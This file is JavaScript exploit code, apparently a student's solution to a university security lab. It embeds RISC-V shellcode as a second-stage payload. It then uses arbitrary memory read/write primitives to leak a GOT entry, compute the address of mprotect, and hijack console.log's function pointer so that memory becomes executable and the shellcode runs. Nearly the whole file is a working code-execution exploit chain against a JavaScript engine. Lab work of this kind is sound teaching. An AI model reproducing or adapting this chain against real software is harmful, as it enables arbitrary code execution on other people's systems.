/*
 * TODO: Part C solution goes here!
 */
const second_stage = 
    "\xb7\x92\x39\x34\x9b\x82\x72\x7b\xb2\x02\x93\x82\xb2\x34\xb6\x02"
  + "\x93\x82\xf2\x22\x23\x3c\x51\xfe\x13\x05\x81\xff\x23\x38\x01\xfe"
  + "\x13\x06\x01\xff\x23\x34\xa1\xfe\x93\x05\x81\xfe\x93\x02\xb0\x03"
  + "\x73\x00\x00\x00";
/* RWX Mapping
 * use mprotect sys call 
 * mark a page on heap as rwx (PROT_READ | PROT_WRITE | PROT_EXEC)
 * hijack console.log
 * write memory to point to mprotect
 * NEED TO FIND WHERE MPROTECT IS
 */

// ctx -> rt -> js malloc usable size
const ctx = cs361s.readmem(cs361s.addrof(console.log) + 48);
const rt = cs361s.readmem(ctx + 24);
const jsMallocUsableSize = cs361s.readmem(rt + 24);
const auipc = cs361s.readmem(jsMallocUsableSize) >>> 12 << 12; // 20 immediate bits
console.log(auipc);
const load = cs361s.readmem(jsMallocUsableSize + 4) >> 20; // 12 immediate bits
//GOT = game of thrones :)
const gameofthrones = cs361s.readmem(jsMallocUsableSize + auipc + load);
//get address of mprotect by decrementing malloc usable size address
const addressmprotect = gameofthrones - 0x31B00;//difference between malloc and protect

/* Populate with Second Stage Payload
 * Either mark the page that holds the second_stage string rwx or 
 * copy the string's contents into the page you have set up.
 * Then jump to the rwx copy of the second-stage payload to execute it.
 * Find where the second stage payload even is
 * look at text segment 
 */
const secondstageaddress = cs361s.addrof(second_stage);
const num = Math.pow(10, -320) * 2.0237;
const addressconsole = cs361s.addrof(console.log);
cs361s.writemem(addressconsole + 48, secondstageaddress);
cs361s.writemem(addressconsole + 56, addressmprotect);
console.log.apply(num, null); //change num to be x10 power of -320
cs361s.writemem(addressconsole + 56, secondstageaddress + 16); 
console.log();
